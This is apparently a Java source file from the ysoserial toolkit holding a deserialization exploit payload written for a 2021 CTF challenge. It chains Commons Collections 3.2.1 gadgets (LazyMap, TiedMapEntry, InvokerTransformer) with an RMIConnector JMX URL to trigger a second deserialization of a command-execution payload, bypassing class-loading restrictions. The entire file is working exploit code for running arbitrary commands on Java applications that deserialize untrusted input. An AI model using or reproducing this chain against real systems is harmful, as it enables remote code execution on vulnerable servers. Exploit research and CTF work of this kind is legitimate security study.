package ysoserial.payloads;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;
import ysoserial.payloads.util.unserUtils;

import javax.management.remote.JMXServiceURL;
import javax.management.remote.rmi.RMIConnector;
import java.util.HashMap;
import java.util.Map;

//tctf final 2021 buggyload
//
//public class JMX {
@Dependencies({"commons-collections:commons-collections:3.2.1"})
public class CommonsCollectionsDoubleUnser extends PayloadRunner implements ObjectPayload<Object> {
    public Object getObject(String command) throws Exception {
        Transformer fakeTransformer = new ConstantTransformer(Object.class);
        Transformer transformer = new InvokerTransformer("connect",null,null);
        //二次反序列化，不受findClass限制
        String expbase64 = unserUtils.objectToB64String(new CommonsCollections5().getObject(command));
        String finalExp = "service:jmx:rmi:///stub/" + expbase64;
        RMIConnector rmiConnector = new RMIConnector(new JMXServiceURL(finalExp), new HashMap<>());

        Map innerMap = new HashMap();
        Map outerMap = LazyMap.decorate(innerMap, fakeTransformer);
//        Map outerMap = DefaultedMap.decorate(innerMap, transformerChain);
        //DefaultedMap可以不用remove
        TiedMapEntry tme = new TiedMapEntry(outerMap, rmiConnector);
        Map expMap = new HashMap();
        expMap.put(tme, "valuevalue");
        outerMap.remove(rmiConnector);
        //transformer设为空put还是报错，所以改lazymap
//        Reflections.setFieldValue(transformer,"iMethodName","connect");
        Reflections.setFieldValue(outerMap,"factory",transformer);
        return expMap;
    }
    public static void main(final String[] args) throws Exception {
        PayloadRunner.run(CommonsCollectionsDoubleUnser.class, args);

//        Object obj = new CommonsCollectionsDoubelUnser().getObject("calc");
//        String hex = unserUtils.objectToHexString(obj);
//        System.out.println(hex);
//        byte[] b2 = unserUtils.hexStringToBytes(hex);
//        InputStream inputStream1 = new ByteArrayInputStream(b2);
//        ObjectInputStream objectInputStream1 = new MyObjectInputStream(inputStream1);
//        System.out.println(objectInputStream1.readUTF());
//        System.out.println(objectInputStream1.readInt());
//        objectInputStream1.readObject();
    }


}
